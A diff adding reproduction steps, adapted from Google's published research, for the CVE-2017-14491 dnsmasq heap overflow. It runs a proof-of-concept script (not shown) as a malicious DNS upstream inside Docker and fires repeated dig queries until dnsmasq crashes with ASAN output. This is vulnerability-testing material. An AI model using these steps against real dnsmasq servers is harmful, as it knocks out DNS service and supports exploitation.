@@ -1,0 +1,24 @@
+// Adapted from Google Security team's work on dnsmasq in 2017, based on CVE-2017-14491-instructions.txt
+// See original at https://github.com/google/security-research-pocs/blobl/master/vulnerabilities/dnsmasq/CVE-2017-14491-instructions.txt
+
+1) Build the Dockerfile and open two terminals 
+
+docker build -t dnsmasq . 
+docker run --rm -t -i --name dnsmasq_test --cap-add=SYS_PTRACE --security-opt seccomp=unconfined dnsmasq bash
+docker cp poc.py dnsmasq_test:/poc.py 
+(in another terminal) docker exec -it <container id> bash
+
+2) Let's launch the poc.py
+# python poc.py 127.0.0.2 53
+Listening at 127.0.0.2
+dnsmasq: started, version 2.76test1-35-g15379ea cachesize 150
+dnsmasq: compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP DHCPv6 no-Lua TFTP no-conntrack ipset auth no-DNSSEC loop-detect inotify
+dnsmasq: using nameserver 127.0.0.2#53
+dnsmasq: cleared cache
+
+3) In another terminal, let's query dnsmasq several times
+# dig @localhost -p 53535 -x 8.8.8.8 > /dev/null
+
+// Run this dig command a few times, the python script will output a "tail" alongside dnsmasq spitting out garbage
+// Eventually, you will hit a "redzone" where dnsmasq will crash showing ASAN output, it will then automatically restart then crash again
+// After some more digging, you will eventually move past the "redzone", where dnsmasq will be able to handle the bad responses again
